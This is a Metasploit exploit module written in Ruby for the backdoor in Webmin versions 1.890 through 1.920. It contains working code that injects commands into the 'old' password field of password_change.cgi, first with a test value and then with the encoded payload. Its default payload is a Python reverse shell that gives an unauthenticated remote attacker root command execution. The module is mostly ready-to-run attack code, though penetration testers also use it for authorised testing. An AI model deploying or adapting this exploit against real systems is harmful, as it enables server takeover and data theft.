##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Webmin 1.920 Unauthenticated RCE',
      'Description'        => %q{
        This module exploits a backdoor in Webmin versions 1.890 through 1.920.
        Only the SourceForge downloads were backdoored, but they are listed as
        official downloads on the project's site.

        Unknown attacker(s) inserted Perl qx statements into the build server's
        source code on two separate occasions: once in April 2018, introducing
        the backdoor in the 1.890 release, and in July 2018, reintroducing the
        backdoor in releases 1.900 through 1.920.

        Only version 1.890 is exploitable in the default install. Later affected
        versions require the expired password changing feature to be enabled.
      },
      'Author'         => [
        'AkkuS <Özkan Mustafa Akkuş>' # Discovery & PoC & Metasploit module @ehakkus
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2019-'],
          ['URL', 'https://www.pentest.com.tr']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 512,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'DefaultOptions' =>
        {
          'RPORT' => 10000,
          'SSL'   => false,
          'PAYLOAD' => 'cmd/unix/reverse_python'
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Webmin <= 1.910', {}]],
      'DisclosureDate' => 'May 16 2019',
      'DefaultTarget'  => 0)
    )
    register_options [
        OptString.new('TARGETURI',  [true, 'Base path for Webmin application', '/'])
    ]
  end

  def peer
    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
  end
  ##
  # Target and input verification
  ##
  def check
    # check passwd change priv
    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, "password_change.cgi"),
      'headers' =>
        {
          'Referer' => "#{peer}/session_login.cgi"
        },
      'cookie'  => "redirect=1; testing=1; sid=x; sessiontest=1"
    })

    if res && res.code == 200 && res.body =~ /Failed/
      res = send_request_cgi(
        {
        'method' => 'POST',
        'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
        'ctype'  => 'application/x-www-form-urlencoded',
        'uri' => normalize_uri(target_uri.path, 'password_change.cgi'),
        'headers' =>
          {
            'Referer' => "#{peer}/session_login.cgi"
          },
        'data' => "user=root&pam=&expired=2&old=AkkuS%7cdir%20&new1=akkuss&new2=akkuss"        
        })

      if res && res.code == 200 && res.body =~ /password_change.cgi/
        return CheckCode::Vulnerable
      else
        return CheckCode::Safe
      end
    else
      return CheckCode::Safe
    end
  end

  ##
  # Exploiting phase
  ##
  def exploit

    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end

    command = payload.encoded
    print_status("Attempting to execute the payload...")
    handler
    res = send_request_cgi(
      {
      'method' => 'POST',
      'cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
      'ctype'  => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'password_change.cgi'),
      'headers' =>
        {
          'Referer' => "#{peer}/session_login.cgi"
        },
      'data' => "user=root&pam=&expired=2&old=AkkuS%7c#{command}%20&new1=akkuss&new2=akkuss"
      })

  end
end
